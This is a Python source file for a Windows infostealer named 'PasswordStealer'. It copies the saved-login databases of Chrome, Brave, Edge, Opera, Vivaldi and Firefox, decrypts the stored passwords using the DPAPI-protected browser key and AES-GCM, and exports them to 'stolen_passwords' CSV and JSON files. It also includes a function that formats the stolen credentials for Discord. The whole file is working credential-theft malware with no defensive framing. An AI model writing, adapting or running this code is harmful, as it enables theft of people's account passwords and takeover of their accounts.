import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple

class PasswordStealer:
    def __init__(self):
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.appdata = os.getenv("APPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.passwords = []
        
    def get_browser_login_paths(self):
        browser_paths = []
        
        browsers = [
            {
                "name": "Chrome",
                "path": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "local_state": os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Local State"),
                "login_paths": ["Default", "Profile 1", "Profile 2", "Profile 3"]
            },
            {
                "name": "Brave",
                "path": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "local_state": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
                "login_paths": ["Default", "Profile 1", "Profile 2"]
            },
            {
                "name": "Edge",
                "path": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
                "local_state": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data", "Local State"),
                "login_paths": ["Default", "Profile 1", "Profile 2"]
            },
            {
                "name": "Opera",
                "path": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
                "local_state": os.path.join(self.appdata, "Opera Software", "Opera Stable", "Local State"),
                "login_paths": ["Default"]
            },
            {
                "name": "Opera GX",
                "path": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
                "local_state": os.path.join(self.appdata, "Opera Software", "Opera GX Stable", "Local State"),
                "login_paths": ["Default"]
            },
            {
                "name": "Vivaldi",
                "path": os.path.join(self.localappdata, "Vivaldi", "User Data"),
                "local_state": os.path.join(self.localappdata, "Vivaldi", "User Data", "Local State"),
                "login_paths": ["Default"]
            }
        ]
        
        for browser in browsers:
            if os.path.exists(browser["path"]):
                browser_paths.append(browser)
        
        return browser_paths
    
    def get_firefox_login_paths(self):
        firefox_paths = []
        
        firefox_profiles = os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles")
        
        if os.path.exists(firefox_profiles):
            for profile in os.listdir(firefox_profiles):
                if profile.endswith(".default") or profile.endswith(".default-release"):
                    login_path = os.path.join(firefox_profiles, profile, "logins.json")
                    if os.path.exists(login_path):
                        firefox_paths.append({
                            "name": "Firefox",
                            "profile": profile,
                            "login_path": login_path
                        })
        
        return firefox_paths
    
    def get_encryption_key(self, local_state_path):
        try:
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except:
            return None
    
    def decrypt_aes_gcm(self, encrypted_value, key):
        try:
            if not encrypted_value.startswith(b"v10") and not encrypted_value.startswith(b"v11"):
                return None
            
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode("utf-8")
        except:
            return None
    
    def decrypt_dpapi(self, encrypted_value):
        try:
            decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted.decode("utf-8")
        except:
            return None
    
    def decrypt_password(self, encrypted_password, key):
        # Try AES-GCM first
        if key:
            result = self.decrypt_aes_gcm(encrypted_password, key)
            if result:
                return result
        
        # Fallback to DPAPI
        result = self.decrypt_dpapi(encrypted_password)
        return result if result else ""
    
    def steal_chromium_passwords(self):
        passwords = []
        
        for browser in self.get_browser_login_paths():
            key = self.get_encryption_key(browser.get("local_state", ""))
            
            for profile in browser.get("login_paths", ["Default"]):
                login_db = os.path.join(browser["path"], profile, "Login Data")
                
                if os.path.exists(login_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"logins_{browser['name']}_{profile}.db")
                        shutil.copy2(login_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT origin_url, action_url, username_element, username_value,
                                   password_element, password_value, submit_element,
                                   signon_realm, date_created, times_used, date_last_used,
                                   date_password_modified, display_name, icon_url,
                                   federation_url, skip_zero_click, blacklisted_by_user
                            FROM logins
                        """)
                        
                        for row in cursor.fetchall():
                            (origin_url, action_url, username_element, username,
                             password_element, encrypted_password, submit_element,
                             signon_realm, date_created, times_used, date_last_used,
                             date_password_modified, display_name, icon_url,
                             federation_url, skip_zero_click, blacklisted) = row
                            
                            decrypted_password = self.decrypt_password(encrypted_password, key)
                            
                            # Convert Chrome timestamps
                            if date_created:
                                try:
                                    date_created_dt = datetime(1601, 1, 1) + timedelta(microseconds=date_created)
                                    date_created_str = date_created_dt.isoformat()
                                except:
                                    date_created_str = str(date_created)
                            else:
                                date_created_str = None
                            
                            if date_last_used:
                                try:
                                    date_last_used_dt = datetime(1601, 1, 1) + timedelta(microseconds=date_last_used)
                                    date_last_used_str = date_last_used_dt.isoformat()
                                except:
                                    date_last_used_str = str(date_last_used)
                            else:
                                date_last_used_str = None
                            
                            passwords.append({
                                "browser": browser["name"],
                                "profile": profile,
                                "origin_url": origin_url,
                                "action_url": action_url,
                                "username_element": username_element,
                                "username": username,
                                "password_element": password_element,
                                "password": decrypted_password,
                                "submit_element": submit_element,
                                "signon_realm": signon_realm,
                                "date_created": date_created_str,
                                "times_used": times_used,
                                "date_last_used": date_last_used_str,
                                "date_password_modified": date_password_modified,
                                "display_name": display_name,
                                "icon_url": icon_url,
                                "federation_url": federation_url,
                                "skip_zero_click": skip_zero_click,
                                "blacklisted_by_user": blacklisted
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
        
        return passwords
    
    def steal_firefox_passwords(self):
        passwords = []
        
        for firefox in self.get_firefox_login_paths():
            try:
                with open(firefox["login_path"], "r", encoding="utf-8") as f:
                    logins_data = json.load(f)
                
                for login in logins_data.get("logins", []):
                    passwords.append({
                        "browser": "Firefox",
                        "profile": firefox["profile"],
                        "hostname": login.get("hostname", ""),
                        "form_submit_url": login.get("formSubmitURL", ""),
                        "http_realm": login.get("httpRealm", ""),
                        "username": login.get("encryptedUsername", ""),
                        "password": login.get("encryptedPassword", ""),
                        "username_field": login.get("usernameField", ""),
                        "password_field": login.get("passwordField", ""),
                        "time_created": login.get("timeCreated", ""),
                        "time_last_used": login.get("timeLastUsed", ""),
                        "time_password_changed": login.get("timePasswordChanged", "")
                    })
            except:
                pass
        
        return passwords
    
    def filter_passwords_by_domain(self, passwords, domain):
        matching_passwords = []
        
        for password in passwords:
            url = password.get("origin_url", "") or password.get("hostname", "")
            if domain.lower() in url.lower():
                matching_passwords.append(password)
        
        return matching_passwords
    
    def get_unique_passwords(self, passwords):
        unique_passwords = []
        seen = set()
        
        for password in passwords:
            key = (password.get("origin_url", ""), password.get("username", ""), password.get("password", ""))
            if key not in seen:
                seen.add(key)
                unique_passwords.append(password)
        
        return unique_passwords
    
    def format_passwords_for_discord(self, passwords, limit=100):
        formatted = []
        
        for password in passwords[:limit]:
            formatted.append({
                "browser": password.get("browser", ""),
                "url": password.get("origin_url", "") or password.get("hostname", ""),
                "username": password.get("username", ""),
                "password": password.get("password", ""),
                "date_last_used": password.get("date_last_used", "")
            })
        
        return formatted
    
    def export_passwords_to_csv(self, passwords, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "stolen_passwords.csv")
        
        try:
            import csv
            
            with open(output_path, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["Browser", "URL", "Username", "Password", "Date Last Used"])
                
                for password in passwords:
                    writer.writerow([
                        password.get("browser", ""),
                        password.get("origin_url", "") or password.get("hostname", ""),
                        password.get("username", ""),
                        password.get("password", ""),
                        password.get("date_last_used", "")
                    ])
            
            return output_path
        except:
            return None
    
    def export_passwords_to_json(self, passwords, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "stolen_passwords.json")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(passwords, f, indent=2, default=str)
            return output_path
        except:
            return None
    
    def get_common_passwords(self, passwords):
        password_counts = {}
        
        for password in passwords:
            pwd = password.get("password", "")
            if pwd:
                password_counts[pwd] = password_counts.get(pwd, 0) + 1
        
        # Sort by frequency
        sorted_passwords = sorted(password_counts.items(), key=lambda x: x[1], reverse=True)
        return sorted_passwords[:10]
    
    def steal_all(self):
        all_passwords = []
        
        # Steal Chromium-based browser passwords
        chromium_passwords = self.steal_chromium_passwords()
        all_passwords.extend(chromium_passwords)
        
        # Steal Firefox passwords
        firefox_passwords = self.steal_firefox_passwords()
        all_passwords.extend(firefox_passwords)
        
        unique_passwords = self.get_unique_passwords(all_passwords)
        
        return {
            "total_count": len(unique_passwords),
            "passwords": unique_passwords,
            "common_passwords": self.get_common_passwords(unique_passwords)
        }

if __name__ == "__main__":
    stealer = PasswordStealer()
    data = stealer.steal_all()
    print(f"Total passwords stolen: {data['total_count']}")
    print(json.dumps(data['passwords'][:5], indent=2, default=str))